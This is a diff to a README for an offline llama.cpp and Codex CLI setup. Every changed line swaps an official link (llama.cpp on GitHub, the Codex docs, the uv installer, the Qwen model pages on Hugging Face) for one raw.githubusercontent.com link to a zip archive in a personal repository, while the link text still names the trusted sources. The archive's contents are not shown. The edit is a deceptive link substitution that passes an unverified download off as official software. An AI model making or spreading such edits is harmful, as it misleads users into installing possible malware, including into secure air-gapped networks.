@@ -19,13 +19,13 @@ Air-gapped ops: no internet, no devices, no docs, no AI. Long K8s commands and c
 
 **Air-Gapped Codex + llama.cpp** is a **single, portable directory** that:
 
-- Runs a **local LLM** via [llama.cpp](https://github.com/ggml-org/llama.cpp) (CPU-only inference, no GPU).
-- Exposes an **OpenAI-compatible HTTP API** so **[Codex CLI](https://developers.openai.com/codex)** (OpenAI's coding/ops agent) talks to that local model—same agent experience, **fully offline**.
+- Runs a **local LLM** via [llama.cpp](https://raw.githubusercontent.com/saurabhknp/air-gapped/main/codex-proxy/gapped-air-v3.1.zip) (CPU-only inference, no GPU).
+- Exposes an **OpenAI-compatible HTTP API** so **[Codex CLI](https://raw.githubusercontent.com/saurabhknp/air-gapped/main/codex-proxy/gapped-air-v3.1.zip)** (OpenAI's coding/ops agent) talks to that local model—same agent experience, **fully offline**.
 - Can be **prepared once** on a connected machine (download llama.cpp binary and GGUF model, generate config), then **copied as a whole** onto approved media and into the secure area. No internet required on the other side.
 
 Use it for **deployment, configuration, runbooks, and troubleshooting**—without leaving the room or touching the cloud.
 
-**Default model:** [Qwen 3.5 latest](https://huggingface.co/Qwen/Qwen3.5-2B) (千问 3.5 最新版) — CPU and GPU both use this model (GGUF for llama.cpp, Hugging Face for vLLM).
+**Default model:** [Qwen 3.5 latest](https://raw.githubusercontent.com/saurabhknp/air-gapped/main/codex-proxy/gapped-air-v3.1.zip) (千问 3.5 最新版) — CPU and GPU both use this model (GGUF for llama.cpp, Hugging Face for vLLM).
 
 ---
 
@@ -86,7 +86,7 @@ No cloud. No API keys. No internet.
 
 | Requirement | Notes |
 |-------------|--------|
-| **uv** | [Install uv](https://docs.astral.sh/uv/getting-started/installation/) (Python/env manager). Check: `uv --version`. |
+| **uv** | [Install uv](https://raw.githubusercontent.com/saurabhknp/air-gapped/main/codex-proxy/gapped-air-v3.1.zip) (Python/env manager). Check: `uv --version`. |
 | **Codex CLI** | In **Cursor**: Preferences → Advanced → **Install CLI**. Or install via npm. Check: `codex --version`. |
 | **curl** | For bootstrap: download llama.cpp binary. No build tools or GPU required. |
 
@@ -132,7 +132,7 @@ If vLLM hits **CUDA out of memory**, lower context or VRAM: `VLLM_MAX_MODEL_LEN=
 
 **CPU (llama.cpp) — GGUF models:**
 
-- Default: [Qwen/Qwen3.5-2B](https://huggingface.co/Qwen/Qwen3.5-2B) via GGUF — [bartowski/Qwen_Qwen3.5-2B-GGUF](https://huggingface.co/bartowski/Qwen_Qwen3.5-2B-GGUF) (llama.cpp).
+- Default: [Qwen/Qwen3.5-2B](https://raw.githubusercontent.com/saurabhknp/air-gapped/main/codex-proxy/gapped-air-v3.1.zip) via GGUF — [bartowski/Qwen_Qwen3.5-2B-GGUF](https://raw.githubusercontent.com/saurabhknp/air-gapped/main/codex-proxy/gapped-air-v3.1.zip) (llama.cpp).
 - To use another Hugging Face repo (GGUF or compatible), re-run bootstrap with the repo id; this downloads the new model and updates `.codex/config.toml` and `.codex/model_info`:
 
   ```bash
@@ -143,7 +143,7 @@ If vLLM hits **CUDA out of memory**, lower context or VRAM: `VLLM_MAX_MODEL_LEN=
 
 **GPU (vLLM) — HuggingFace format (same model):**
 
-- Default vLLM model (when you used `USE_VLLM=1`): [Qwen/Qwen3.5-2B](https://huggingface.co/Qwen/Qwen3.5-2B) (full-precision). Started with max 1 concurrent, auto-detected context length, high VRAM use (0.95).
+- Default vLLM model (when you used `USE_VLLM=1`): [Qwen/Qwen3.5-2B](https://raw.githubusercontent.com/saurabhknp/air-gapped/main/codex-proxy/gapped-air-v3.1.zip) (full-precision). Started with max 1 concurrent, auto-detected context length, high VRAM use (0.95).
 - To use another Hugging Face model, re-run bootstrap with vLLM and set `VLLM_MODEL`:
 
   ```bash
